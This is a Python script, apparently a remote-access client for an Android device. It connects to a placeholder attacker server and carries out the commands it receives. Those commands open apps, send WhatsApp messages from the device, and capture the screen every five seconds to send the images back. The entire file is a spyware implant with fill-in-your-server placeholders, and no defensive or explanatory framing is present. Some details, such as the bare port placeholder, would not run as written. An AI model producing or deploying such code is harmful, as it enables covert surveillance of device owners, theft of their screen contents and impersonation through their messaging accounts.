import socket
import subprocess
import os
import time
from PIL import ImageGrab

# Connect to the server
server_ip = 'your_server_ip'  # Replace with your server IP
server_port = your_server_port  # Replace with your server port
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

# Function to capture screenshots and send to the server
def screen_capture(client):
    while True:
        try:
            # Capture the screen and save as an image
            screen = ImageGrab.grab()
            screen.save("screenshot.jpg")

            # Send the image file to the server
            with open("screenshot.jpg", "rb") as f:
                client.send(f.read())
            
            time.sleep(5)  # Capture every 5 seconds
        except Exception as e:
            print(f"Error capturing screen: {e}")
            break

# Function to execute commands sent from the server
def execute_command(command):
    try:
        if command.startswith("open_app"):
            app_name = command.split(' ')[1]
            subprocess.run(["am", "start", "-n", f"{app_name}"])

        elif command == "screenshot":
            screen_capture(client)

        elif command.startswith("send_message"):
            # Example for sending a message via WhatsApp (modify this as needed)
            number = command.split(' ')[1]
            message = " ".join(command.split(' ')[2:])
            subprocess.run(['am', 'start', f'https://api.whatsapp.com/send?phone={number}&text={message}'])

    except Exception as e:
        print(f"Error executing command: {e}")

# Function to handle incoming commands from the server
def receive_commands():
    while True:
        try:
            command = client.recv(1024).decode('utf-8')
            if command:
                execute_command(command)
        except Exception as e:
            print(f"Error receiving command: {e}")
            break

# Start receiving commands
receive_commands()
